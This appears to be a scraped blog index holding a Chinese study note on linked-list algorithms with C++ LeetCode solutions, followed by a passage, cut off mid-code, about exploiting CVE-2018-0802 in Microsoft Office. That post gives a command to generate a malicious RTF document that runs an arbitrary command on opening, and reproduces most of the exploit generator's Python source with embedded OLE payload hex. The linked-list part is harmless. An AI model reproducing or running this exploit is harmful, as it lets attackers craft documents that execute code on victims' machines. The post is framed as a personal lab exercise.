点击右侧的蓝色反向双箭头，可以看到这些json链接的作用是为了让用户可以对比任意两次接口测试结果：","categories":[],"tags":[{"name":"后端","slug":"后端","permalink":"https://czqu.net/tags/%E5%90%8E%E7%AB%AF/"},{"name":"java","slug":"java","permalink":"https://czqu.net/tags/java/"},{"name":"idea","slug":"idea","permalink":"https://czqu.net/tags/idea/"},{"name":"测试","slug":"测试","permalink":"https://czqu.net/tags/%E6%B5%8B%E8%AF%95/"}],"author":"陈子琦"},{"title":"算法与数据结构学习笔记：链表","slug":"release/2020-7-12-linked_list","date":"2020-07-24T04:01:00.000Z","updated":"2020-07-24T04:01:00.000Z","comments":true,"path":"posts/26939/","permalink":"https://czqu.net/posts/26939/","excerpt":"","text":"核心知识点 null异常处理 dummy node 哑巴节点 双指针/快慢指针 插入一个节点到排序链表 从一个链表中移除一个节点 翻转链表 合并两个链表 找到链表的中间节点 例题：83. 删除排序链表中的重复元素 给定一个排序链表，删除所有重复的元素，使得每个元素只出现一次。 示例 1: 输入: 1-&gt;1-&gt;2输出: 1-&gt;2示例 2: 输入: 1-&gt;1-&gt;2-&gt;3-&gt;3输出: 1-&gt;2-&gt;3 直接法：链表是有序的，所以直接更改当前结点的 next 指针，跳过下一个结点并直接指向下一个结点之后的结点即可。 123456789101112131415161718192021222324252627282930/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) {} * }; */class Solution {public: ListNode* deleteDuplicates(ListNode* head) { ListNode *current=head; //null异常处理 while(current!=NULL&amp;&amp;current-&gt;next!=NULL) { //一直删除，直到下一个不重复 // 想想如果把while改成if怎么样 //把current-&gt;next!=NULL删除会怎么样 while(current-&gt;next!=NULL&amp;&amp;current-&gt;val==current-&gt;next-&gt;val) { current-&gt;next=current-&gt;next-&gt;next; } //移动到下一个节点 current=current-&gt;next; } return head; }}; 时间复杂度：O(n)，因为列表中的每个结点都检查一次以确定它是否重复，所以总运行时间为 O(n)，其中 n是列表中的结点数。 空间复杂度：O(1)，没有使用额外的空间。 82. 删除排序链表中的重复元素 II 给定一个排序链表，删除所有含有重复数字的节点，只保留原始链表中 没有重复出现 的数字。 示例 1: 输入: 1-&gt;2-&gt;3-&gt;3-&gt;4-&gt;4-&gt;5输出: 1-&gt;2-&gt;5示例 2: 输入: 1-&gt;1-&gt;1-&gt;2-&gt;3输出: 2-&gt;3 利用哑结点 ：为了防止删除头结点的极端情况发生，先创建空结点dummy，使dummy指向传入的head结点。 然后创建一个cur指针指向dummy，比较cur的后两个结点，看他们是否相同。 如果相同，则说明cur后有重复元素，此时创建一个temp指针指向第一个重复元素，即cur-&gt;next; 通过循环进行去重，循环结束后temp指向的是这群重复元素的最后一个，依照题意此时temp的下一个才是我们想要的。 123456789101112131415161718192021222324252627282930313233343536373839/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) {} * }; */class Solution {public: ListNode* deleteDuplicates(ListNode* head) { //设置哑结点 防止删除头结点的情况发生后的问题 ListNode *dummy=new ListNode(-1); dummy-&gt;next=head; ListNode *cur=dummy;//cur 指向哑结点 while(cur-&gt;next!=NULL&amp;&amp;cur-&gt;next-&gt;next!=NULL) { //比较cur后两个结点 if(cur-&gt;next-&gt;val==cur-&gt;next-&gt;next-&gt;val) { //去重 ListNode *temp=cur-&gt;next; while(temp-&gt;next!=NULL&amp;&amp;temp-&gt;val==temp-&gt;next-&gt;val) { temp=temp-&gt;next; } //temp前的重复结点都跳过了，现在我们跳过temp cur-&gt;next=temp-&gt;next; } else { //如果cur后两个结点不重复，直接前移 cur=cur-&gt;next; } } return dummy-&gt;next; }}; 时间复杂度：O(n) 空间复杂度：O(1) 206. 反转链表 反转一个单链表。 示例: 输入: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL输出: 5-&gt;4-&gt;3-&gt;2-&gt;1-&gt;NULL 双指针如图，定义两个指针，pre在前 cur在后,temp 保存向前的pre指针的临时指针 每次进行一次局部翻转， 当pre到达尾部的时候终止，此时cur指向最后一个节点。 12345678910111213141516171819202122232425262728/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) {} * }; */class Solution {public: ListNode* reverseList(ListNode* head) { /*定义两个指针，pre在前 cur在后 *当pre到达尾部的时候终止，此时cur指向最后一个节点 */ ListNode *pre=head; ListNode *cur=NULL; ListNode *temp=NULL; while(pre!=NULL) { temp=pre;//临时存储pre pre=pre-&gt;next;//pre指向下一个节点 temp-&gt;next=cur;//翻转指针 cur=temp;//cur指针向前移动一步 } return cur; }}; 92. 反转链表 II 反转从位置 m 到 n 的链表。请使用一趟扫描完成反转。 说明:1 ≤ m ≤ n ≤ 链表长度。 示例: 12&gt;输入: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL, m = 2, n = 4&gt;输出: 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;NULL 迭代法：参考上题，先遍历到 m 处，再翻转 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) {} * }; */class Solution {public: ListNode* reverseBetween(ListNode* head, int m, int n) { if(head==NULL) return NULL; ListNode *pre,*cur; pre=head; cur=NULL; //遍历到m节点，如果只有一个节点，跳过，这里cur会为空但是后面翻转链表的时候就不是了 while(m&gt;1) { cur=pre; pre=pre-&gt;next; m--; n--; } //m节点的前一个节点 ListNode*con=cur; ListNode*temp=NULL; //用于保存被翻转链表的第一个节点 ListNode*front=pre; //反转m-n的节点 while(n--) { temp=pre; pre=pre-&gt;next; temp-&gt;next=cur; cur=temp; } //如果不只是一个节点，那么就把指针指向被翻转的链表的最后一个节点 if(con!=NULL) { con-&gt;next=cur; } else { //否则直接输出此节点 head=cur; } //被翻转的链表原来的头变尾 front-&gt;next=pre; return head; }}; 21. 合并两个有序链表 将两个升序链表合并为一个新的 升序 链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的。 示例： 输入：1-&gt;2-&gt;4, 1-&gt;3-&gt;4输出：1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4 迭代法：直接连接各个节点 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode() : val(0), next(nullptr) {} * ListNode(int x) : val(x), next(nullptr) {} * ListNode(int x, ListNode *next) : val(x), next(next) {} * }; */class Solution {public: ListNode* mergeTwoLists(ListNode* l1, ListNode* l2) { ListNode *dummy=new ListNode(-1); ListNode *cur=dummy; //将小的节点接到哑结点为头的链表中 while(l1!=NULL&amp;&amp;l2!=NULL) { if(l1-&gt;val&gt;l2-&gt;val) { cur-&gt;next=l2; cur=cur-&gt;next; l2=l2-&gt;next; } else { cur-&gt;next=l1; cur=cur-&gt;next; l1=l1-&gt;next; } } //处理剩下的节点 if(l1!=NULL) { cur-&gt;next=l1; } if(l2!=NULL) { cur-&gt;next=l2; } return dummy-&gt;next; }}; 86. 分隔链表 给定一个链表和一个特定值 x，对链表进行分隔，使得所有小于 x 的节点都在大于或等于 x 的节点之前。 你应当保留两个分区中每个节点的初始相对位置。 示例: 输入: head = 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;2, x = 3输出: 1-&gt;2-&gt;2-&gt;4-&gt;3-&gt;5 当头节点不确定的时候，使用哑巴节点 将大于 x 的节点，放到另外一个链表，最后连接这两个链表 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) {} * }; */class Solution {public: ListNode* partition(ListNode* head, int x) { if(head==NULL) return head; ListNode *headDummy=new ListNode(-1); ListNode *tailDummy=new ListNode(-1); ListNode *cur=NULL,*tail=tailDummy; headDummy-&gt;next=head; head=headDummy; while(head-&gt;next!=NULL) { if(head-&gt;next-&gt;val&lt;x) { head=head-&gt;next; } //这里把大于X的节点删除，然后连接到另一个链表 else { cur=head-&gt;next; //删除大于X的节点 head-&gt;next=head-&gt;next-&gt;next; //连接到新链表 tail-&gt;next=cur; tail=tail-&gt;next; } } //拼接两个链表 //tail代表tailDummy最后一个节点，它的后面可能还连着，要断掉 //如输入[1,4,3,2,5,2]就会有错,没有处理5-&gt;2 tail-&gt;next=NULL; head-&gt;next=tailDummy-&gt;next; return headDummy-&gt;next; }}; 876. 链表的中间结点 给定一个带有头结点 head 的非空单链表，返回链表的中间结点。 如果有两个中间结点，则返回第二个中间结点。 1234567891011121314151617181920212223/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) {} * }; */class Solution {public: ListNode* middleNode(ListNode* head) { ListNode *slow,*fast; slow=head; fast=head; while(fast!=NULL&amp;&amp;fast-&gt;next!=NULL) { slow=slow-&gt;next; fast=fast-&gt;next-&gt;next; } return slow; }}; 总结：如果链表长度是偶数，返回中间偏右的位置 且fast如果初始化为head-&gt;next 返回中间偏左的位置。 奇数长度则两者相同。 148. 排序链表 在 O(n log n) 时间复杂度和常数级空间复杂度下，对链表进行排序。 示例 1: 输入: 4-&gt;2-&gt;1-&gt;3输出: 1-&gt;2-&gt;3-&gt;4示例 2: 输入: -1-&gt;5-&gt;3-&gt;4-&gt;0输出: -1-&gt;0-&gt;3-&gt;4-&gt;5 递归归并排序链表，找中点和合并操作 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) {} * }; */class Solution {public: ListNode* sortList(ListNode* head) { return mergeSort(head); } //寻找链表中点，快慢指针，快的到达终点，慢的刚好到中点 //当链表的长度是奇数时，slow 恰巧停在中点位置；如果长度是偶数，slow 最终的位置是中间偏右： //此题我们让head先走，则停在中间偏左的位置 //148 143 141都有快慢指针 ListNode *findMiddle(ListNode *head) { ListNode *slow,*fast; slow=head; fast=head-&gt;next; while(fast!=NULL&amp;&amp;fast-&gt;next!=NULL) { slow=slow-&gt;next; fast=fast-&gt;next-&gt;next; } return slow; } //合并两个链表，参考归并排序 ListNode * mergeTwoLists(ListNode*left,ListNode*right) { ListNode *dummy=new ListNode(-1); ListNode *head=dummy; while(left!=NULL&amp;&amp;right!=NULL) { if(left-&gt;val&gt;right-&gt;val) { head-&gt;next=right; right=right-&gt;next; } else { head-&gt;next=left; left=left-&gt;next; } //下一个 head=head-&gt;next; } //处理剩下节点 while(left!=NULL) { head-&gt;next=left; head=head-&gt;next; left=left-&gt;next; } while(right!=NULL) { head-&gt;next=right; head=head-&gt;next; right=right-&gt;next; } return dummy-&gt;next; } ListNode *mergeSort(ListNode *head) { if(head==NULL||head-&gt;next==NULL) { return head; } ListNode *middle=findMiddle(head); // 断开中间节点 ListNode* tail=middle-&gt;next; middle-&gt;next=NULL; //左右分别进行归并排序 ListNode *left=mergeSort(head); ListNode *right=mergeSort(tail); ListNode *res=mergeTwoLists(left, right); return res; }}; 143. 重排链表 给定一个单链表 L：L0→L1→…→Ln-1→Ln ，将其重新排列后变为： L0→Ln→L1→Ln-1→L2→Ln-2→… 你不能只是单纯的改变节点内部的值，而是需要实际的进行节点交换。 示例 1: 给定链表 1-&gt;2-&gt;3-&gt;4, 重新排列为 1-&gt;4-&gt;2-&gt;3.示例 2: 给定链表 1-&gt;2-&gt;3-&gt;4-&gt;5, 重新排列为 1-&gt;5-&gt;2-&gt;4-&gt;3. 此题目为2019年计算机统考408真题 思路：找到中点断开，翻转后面部分，然后合并前后两个链表 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode() : val(0), next(nullptr) {} * ListNode(int x) : val(x), next(nullptr) {} * ListNode(int x, ListNode *next) : val(x), next(next) {} * }; */class Solution {public: //快慢指针找中点，同上一题 //148 143 141都有快慢指针 ListNode * findMiddle(ListNode *head) { ListNode *slow,*fast; slow=head; fast=head; //如果是偶数个节点，返回中间偏右的位置 //你改成fast=head-&gt;next返回中间偏左也是对的 //有趣吧，画个图就知道了 while(fast!=NULL&amp;&amp;fast-&gt;next!=NULL) { slow=slow-&gt;next; fast=fast-&gt;next-&gt;next; } return slow; } //合并两个链表 ListNode * mergeTwoLists(ListNode* l1,ListNode*l2) { ListNode* dummy=new ListNode(-1); bool toggle =true; ListNode *head=dummy; //间断连接两个链表 while(l1!=NULL&amp;&amp;l2!=NULL) { if(toggle) { head-&gt;next=l1; l1=l1-&gt;next; } else { head-&gt;next=l2; l2=l2-&gt;next; } toggle=!toggle; head=head-&gt;next; } //连接剩下的节点 while(l1!=NULL) { head-&gt;next=l1; l1=l1-&gt;next; head=head-&gt;next; } while(l2!=NULL) { head-&gt;next=l2; l2=l2-&gt;next; head=head-&gt;next; } return dummy-&gt;next; } void reorderList(ListNode* head) { if(head==NULL||head-&gt;next==NULL) return ; //找到中点 断开 ListNode *middle=findMiddle(head); ListNode *tail=middle-&gt;next; middle-&gt;next=NULL; //翻转链表 ListNode *cur,*pre; pre=tail; cur=NULL; while(pre!=NULL) { ListNode *temp=pre; pre=pre-&gt;next; temp-&gt;next=cur; cur=temp; } tail=cur; //合并链表 head-&gt;next=mergeTwoLists(head,tail)-&gt;next; } }; 141. 环形链表 给定一个链表，判断链表中是否有环。 为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。 示例 1： 输入：head = [3,2,0,-4], pos = 1 输出：true 解释：链表中有一个环，其尾部连接到第二个节点。 示例 2： 输入：head = [1,2], pos = 0 输出：true 解释：链表中有一个环，其尾部连接到第一个节点。 示例 3： 输入：head = [1], pos = -1 输出：false 解释：链表中没有环。 快慢指针即可，就像你在操场跑步，操场有环，只要你和她速度不一样，你们总能与她相遇，如果是直线，她到了终点，你就再也追不上她 1234567891011121314151617181920212223242526272829/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) {} * }; *///148 143 141 142都有快慢指针class Solution {public: bool hasCycle(ListNode *head) { if(head==NULL) return false; ListNode *fast,*slow; slow=head; fast=head; while(fast!=NULL&amp;&amp;fast-&gt;next!=NULL) { slow=slow-&gt;next; fast=fast-&gt;next-&gt;next; // 比较指针是否相等 if(slow==fast) return true; } return false; }}; 142. 环形链表 II 给定一个链表，返回链表开始入环的第一个节点。 如果链表无环，则返回 null。 为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。 说明：不允许修改给定的链表。 示例 ： 输入：head = [3,2,0,-4], pos = 1输出：tail connects to node index 1解释：链表中有一个环，其尾部连接到第二个节点。 。 Floyd 算法你在操场跑步，操场有环，只要你和她速度不一样，你们总能与她相遇，如果是直线，她到了终点，你就再也追不上她。此题分为两个阶段，第一个阶段先用快慢指针测试是否有环，第二阶段慢指针回到头head,然后各自以相同速度前进，相遇点即为入环处（可以自己画图尝试）。严格的数学证明可参考leetcode官方题解。 123456789101112131415161718192021222324252627282930313233343536/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) {} * }; */class Solution {public: ListNode *detectCycle(ListNode *head) { if(head==NULL) return NULL; ListNode *slow,*fast; slow=head; fast=head;//如果这里是fast=fast-&gt;next，那么下面该怎么改？ while(fast!=NULL&amp;&amp;fast-&gt;next!=NULL) { slow=slow-&gt;next; fast=fast-&gt;next-&gt;next; if(slow==fast) { //回到起点，各自以相同速度前进 slow=head; while(slow!=fast) { slow=slow-&gt;next; fast=fast-&gt;next; } return slow; } } return NULL; }}; 234. 回文链表 请判断一个链表是否为回文链表。 示例 1: 12&gt;输入: 1-&gt;2&gt;输出: false 示例 2: 12&gt;输入: 1-&gt;2-&gt;2-&gt;1&gt;输出: true 先找到链表中点，然后后面的翻转链表，一个个比较。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) {} * }; */class Solution {public: bool isPalindrome(ListNode* head) { if(head==NULL||head-&gt;next==NULL) return true; ListNode *slow,*fast; slow=head; fast=head-&gt;next; while(fast!=NULL&amp;&amp;fast-&gt;next!=NULL) { slow=slow-&gt;next; fast=fast-&gt;next-&gt;next; } //偶数长度slow是中间偏左的节点 //奇数长度slow是中点 ListNode *cur,*pre,*tail,*temp; //分离两个链表 tail=slow-&gt;next; slow-&gt;next=NULL; //翻转链表 pre=tail; cur=NULL; while(pre!=NULL) { temp=pre; pre=pre-&gt;next; temp-&gt;next=cur; cur=temp; } //原链表的最后一个节点现在变成头结点 tail=cur; while(head!=NULL&amp;&amp;tail!=NULL) { if(tail-&gt;val!=head-&gt;val) { return false; } head=head-&gt;next; tail=tail-&gt;next; } return true; }}; 138. 复制带随机指针的链表 给定一个链表，每个节点包含一个额外增加的随机指针，该指针可以指向链表中的任何节点或空节点。 要求返回这个链表的 深拷贝。 我们用一个由 n 个节点组成的链表来表示输入/输出中的链表。每个节点用一个 [val, random_index] 表示： val：一个表示 Node.val 的整数。random_index：随机指针指向的节点索引（范围从 0 到 n-1）；如果不指向任何节点，则为 null 。 复制节点跟在原节点后面即可 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354/*// Definition for a Node.class Node {public: int val; Node* next; Node* random; Node(int _val) { val = _val; next = NULL; random = NULL; }};*/class Solution {public: Node* copyRandomList(Node* head) { if(head==NULL) return head; auto cur=head; //复制节点到后面 while(cur!=NULL) { auto clone=new Node(cur-&gt;val); clone-&gt;next=cur-&gt;next; clone-&gt;random=cur-&gt;random; cur-&gt;next=clone; cur=clone-&gt;next; } //处理random指针 cur=head; while(cur!=NULL) { if(cur-&gt;random!=NULL) { cur-&gt;next-&gt;random=cur-&gt;random-&gt;next; } cur=cur-&gt;next-&gt;next; } //分离链表 cur=head; auto cloneHead=cur-&gt;next; while(cur!=NULL&amp;&amp;cur-&gt;next!=NULL) { auto temp=cur-&gt;next; cur-&gt;next=cur-&gt;next-&gt;next; cur=temp; } return cloneHead; }};","categories":[],"tags":[{"name":"cpp","slug":"cpp","permalink":"https://czqu.net/tags/cpp/"},{"name":"算法","slug":"算法","permalink":"https://czqu.net/tags/%E7%AE%97%E6%B3%95/"},{"name":"数据结构","slug":"数据结构","permalink":"https://czqu.net/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"链表","slug":"链表","permalink":"https://czqu.net/tags/%E9%93%BE%E8%A1%A8/"}],"author":"陈子琦"},{"title":"记一次CVE-2018-0802漏洞的简单利用","slug":"release/2020-6-21-simple-CVE-2018-0802-office-2010","date":"2020-06-21T16:00:00.000Z","updated":"2020-06-21T16:00:00.000Z","comments":true,"path":"posts/63237/","permalink":"https://czqu.net/posts/63237/","excerpt":"","text":"受影响的版本 Microsoft Office 2007 Service Pack 3 Microsoft Office 2010 Service Pack 2 (32-bit editions) Microsoft Office 2010 Service Pack 2 (64-bit editions) Microsoft Office 2013 Service Pack 1 (32-bit editions) Microsoft Office 2013 Service Pack 1 (64-bit editions) Microsoft Office 2016 (32-bit edition) Microsoft Office 2016 (64-bit edition) Microsoft Office 2016 Click-to-Run (C2R) for 32-bit editions Microsoft Office 2016 Click-to-Run (C2R) for 64-bit editions Microsoft Office Compatibility Pack Service Pack 3 Microsoft Word 2007 Service Pack 3 Microsoft Word 2010 Service Pack 2 (32-bit editions) Microsoft Word 2010 Service Pack 2 (64-bit editions) Microsoft Word 2013 RT Service Pack 1 Microsoft Word 2013 Service Pack 1 (32-bit editions) Microsoft Word 2013 Service Pack 1 (64-bit editions) Microsoft Word 2016 (32-bit edition) Microsoft Word 2016 (64-bit edition) 这个漏洞需要打了CVE-2017-11882的补丁后才有效。 首先准备好用于生成利用漏洞的文件 在这里下载：https://github.com/Ridter/RTF_11882_0802 或者直接复制附录的内容存为对应文件： 然后执行： 1python RTF_11882_0802.py -c \"cmd.exe /c calc.exe\" -o test.doc 将文件复制到靶机，我这里为了方便直接复制到kali自带的Apache里面让靶机去下载了。 打开刚刚我们生成的文件后就会发现打开word的同时启动了计算器。 附录RTF_11882_0802.py 的代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205#!/usr/bin/env python#-*- coding: utf-8 -*-# @Author : Evi1cg\"\"\"See the file 'LICENSE' for copying permission\"\"\"import argparseimport sysfrom struct import packLOGO = R\"\"\" ___ ___ /\\ \\ /\\__\\ /::\\ \\ ___ /:/ _/_ /:/\\:\\__\\ /\\__\\ /:/ /\\__\\ /:/ /:/ / /:/ / /:/ /:/ / /:/_/:/__/___ /:/__/ /:/_/:/ / \\:\\/:::::/ / /::\\ \\ \\:\\/:/ / \\::/~~/~~~~ /:/\\:\\ \\ \\::/__/ \\:\\~~\\ \\/__\\:\\ \\ \\:\\ \\ \\:\\__\\ \\:\\__\\ \\:\\__\\ \\/__/ \\/__/ \\/__/ \"\"\"RTF_HEADER = R\"\"\"{\\rtf1\\ansi\\ansicpg1252\\deff0\\nouicompat\\deflang1033{\\fonttbl{\\f0\\fnil\\fcharset0 Calibri;}}{\\*\\generator Riched20 6.3.9600}\\viewkind4\\uc1\\pard\\sa200\\sl276\\slmult1\\f0\\fs22\\lang9\"\"\"RTF_TRAILER = R\"\"\"\\par}\"\"\"OBJCLASS11882 =R\"\"\"{\\object\\objemb\\objupdate{\\*\\objclass Equation.3}\\objw660\\objh260{\\*\\objdata 01050000020000000b0000004571756174696f6e2e33000000000000000000000c0000d0cf11e0a1b11ae1000000000000000000000000000000003e000300feff0900060000000000000000000000010000000100000000000000001000000200000001000000feffffff0000000000000000fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffdffffff04000000fefffffffefffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff52006f006f007400200045006e00740072007900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016000500ffffffffffffffff0200000002ce020000000000c0000000000000460000000000000000000000008020cea5613cd30103000000000200000000000001004f006c00650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000201ffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000000000000000000001400000000000000010043006f006d0070004f0062006a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000120002010100000003000000ffffffff00000000000000000000000000000000000000000000000000000000000000000000000001000000660000000000000003004f0062006a0049006e0066006f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012000201ffffffff04000000ffffffff000000000000000000000000000000000000000000000000000000000000000000000000030000000600000000000000feffffff02000000fefffffffeffffff050000000600000007000000feffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff010000020800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100feff030a0000ffffffff02ce020000000000c000000000000046170000004d6963726f736f6674204571756174696f6e20332e30000c0000004453204571756174696f6e000b0000004571756174696f6e2e3300f439b271000000000000000000000000000000000000000000000000000000000000000000000000000000000300040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\"\"\"OBJECT_HEADER = R\"\"\"{\\object\\objemb\\objupdate{\\*\\objclass Equation.3}\\objw380\\objh260{\\*\\objdata \"\"\"OBJECT_TRAILER = R\"\"\"}{\\result {\\rtlch\\fcs1 \\af0 \\ltrch\\fcs0 \\dn8\\insrsid95542\\charrsid95542 {\\pict{\\*\\picprop\\shplid1025{\\sp{\\sn shapeType}{\\sv 75}}{\\sp{\\sn fFlipH}{\\sv 0}}{\\sp{\\sn fFlipV}{\\sv 0}}{\\sp{\\sn fLockAspectRatio}{\\sv 1}}{\\sp{\\sn pictureGray}{\\sv 0}}{\\sp{\\sn pictureBiLevel}{\\sv 0}}{\\sp{\\sn fRecolorFillAsPicture}{\\sv 0}}{\\sp{\\sn fUseShapeAnchor}{\\sv 0}}{\\sp{\\sn fFilled}{\\sv 0}}{\\sp{\\sn fHitTestFill}{\\sv 1}}{\\sp{\\sn fillShape}{\\sv 1}}{\\sp{\\sn fillUseRect}{\\sv 0}}{\\sp{\\sn fNoFillHitTest}{\\sv 0}}{\\sp{\\sn fLine}{\\sv 0}}{\\sp{\\sn fPreferRelativeResize}{\\sv 1}}{\\sp{\\sn fReallyHidden}{\\sv 0}}{\\sp{\\sn fScriptAnchor}{\\sv 0}}{\\sp{\\sn fFakeMaster}{\\sv 0}}{\\sp{\\sn fCameFromImgDummy}{\\sv 0}}{\\sp{\\sn fLayoutInCell}{\\sv 1}}}\\picscalex100\\picscaley100\\piccropl0\\piccropr0\\piccropt0\\piccropb0\\picw353\\pich600\\picwgoal200\\pichgoal340\\wmetafile8\\bliptag1846300541\\blipupi2307{\\*\\blipuid 6e0c4f7df03da08a8c6c623556e3c652}0100090000035100000000001200000000000500000009020000000005000000020101000000050000000102ffffff00050000002e0118000000050000000b0200000000050000000c02200240011200000026060f001a00ffffffff000010000000c0ffffffaaffffff00010000ca0100000b00000026060f000c004d61746854797065000040000a00000026060f000a00ffffffff010000000000030000000000}}}}\"\"\"OBJECT_TRAILER11882 =R\"\"\"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004500710075006100740069006F006E0020004E00610074006900760065000000000000000000000000000000000000000000000000000000000000000000000020000200FFFFFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000004000000C5000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001050000050000000D0000004D45544146494C4550494354003421000035FEFFFF9201000008003421CB010000010009000003C500000002001C00000000000500000009020000000005000000020101000000050000000102FFFFFF00050000002E0118000000050000000B0200000000050000000C02A001201E1200000026060F001A00FFFFFFFF000010000000C0FFFFFFC6FFFFFFE01D0000660100000B00000026060F000C004D61746854797065000020001C000000FB0280FE0000000000009001000000000402001054696D6573204E657720526F6D616E00FEFFFFFF6B2C0A0700000A0000000000040000002D0100000C000000320A600190160A000000313131313131313131310C000000320A6001100F0A000000313131313131313131310C000000320A600190070A000000313131313131313131310C000000320A600110000A000000313131313131313131310A00000026060F000A00FFFFFFFF0100000000001C000000